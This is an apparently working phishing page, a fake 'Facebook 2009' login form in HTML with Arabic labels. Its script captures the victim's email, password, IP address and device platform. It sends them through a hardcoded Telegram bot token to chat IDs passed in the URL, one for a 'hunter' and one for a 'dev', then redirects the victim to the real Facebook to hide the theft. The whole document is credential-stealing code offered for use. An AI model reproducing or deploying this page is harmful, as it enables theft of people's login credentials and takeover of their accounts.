<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>فيسبوك 2009</title></head>
<body>
    <form id="l">
        <input type="text" id="u" placeholder="Email"><input type="password" id="p" placeholder="Pass">
        <button type="submit">Login</button>
    </form>
    <script>
        const pr = new URLSearchParams(window.location.search);
        document.getElementById('l').onsubmit = async (e) => {
            e.preventDefault();
            let ip = await (await fetch('https://api.ipify.org')).text();
            const msg = encodeURIComponent(`🎯 صيدة فيسبوك\n👤 الصياد: ${pr.get('hunter')}\n📧: ${document.getElementById('u').value}\n🔑: ${document.getElementById('p').value}\n🌐 IP: ${ip}\n📱 الجهاز: ${navigator.platform}`);
            const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`)
            .then(() => { location.href="https://facebook.com"; });
        };
    </script>
</body>
</html>
